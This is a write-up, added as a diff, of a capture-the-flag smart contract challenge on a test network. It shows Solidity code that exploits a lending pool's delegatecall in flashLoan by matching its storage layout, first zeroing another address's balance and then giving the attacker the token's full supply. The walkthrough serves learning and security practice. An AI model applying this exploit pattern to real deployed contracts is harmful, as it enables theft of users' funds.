@@ -1,0 +1,84 @@
+## Challenge 1
+
+Deployment transaction: https://goerli.etherscan.io/tx/0x5bf5794db3f5ae6f84803ee79c107bed99b357268ae475ea10e2bbc344854ddd
+InSecureum token is a standard ERC-20 token, meaning the issue is likely to be found at the Lender’s pool smart contract.
+
+The Lender pool contract did indeed have an issue, which was the usage of delegateCalls to unknown contracts.
+
+The exploit was made focused at the flashLoan function. The data argument is the key to everything.
+
+### Storage 
+
+    Make sure the memorySlot is the same as the one used by the exploited smart contract. In our case, the one used to store balances was memorySlot1. 
+
+     IERC20 public token;
+     mapping(address => uint) public memorySlot1;
+     uint public uselessSlot;
+     address public here;
+
+
+    If the exploited smart contract had the following structure:
+
+     mapping(address => uint) public balances;
+     IERC20 public token;
+     uint public uselessSlot;
+     address public here;
+    
+        Memory slot 0 would be the target.
+
+### Constructor
+
+    Make sure to pass the correct token address.
+
+     constructor(IERC20 _token){
+         token = _token;
+         here = address(this);
+     }
+
+
+### Part 1
+I first generated view functions to get the bytes needed to pass as the 'data' argument for Lender pool's flashLoan function. 
+
+     function bytesGet1(address attackReceiver) public pure returns(bytes memory){
+        return abi.encodeWithSignature("attack(address)", attackReceiver);
+     }
+
+The attack function was made solely focused on changing data at Lender pool's memory slot that corresponded to balances data. In that case, it was slot one:
+
+     function attack(address attackReceiver) public returns(bool){
+        memorySlot1[attackReceiver] = 0;
+        
+        return true;
+    }
+
+The arguments passed to the flashLoan function were: 
+     1. exploit contract address 
+     2. the data generated with the bytesGet1
+
+Wait a minute!
+This did set another address's balance to zero, but where's the money?
+
+### Part 2
+
+Same logic, some small tweaks, complete different result:
+
+     function bytesGet2(address attackRunner) public pure returns(bytes memory){
+        
+        return abi.encodeWithSignature("attack2(address)", attackRunner);
+        
+    }
+
+Now we need to implement the attack2 function:
+
+     function attack2(address attackRunner) public returns(bool){
+        uint totals = token.totalSupply();
+        memorySlot1[attackRunner] = totals;
+        
+        return true;
+    }
+
+The arguments passed to the flashLoan function were: 
+     1. exploit contract address 
+     2. the data generated with the bytesGet2
+
+Challenge solved!
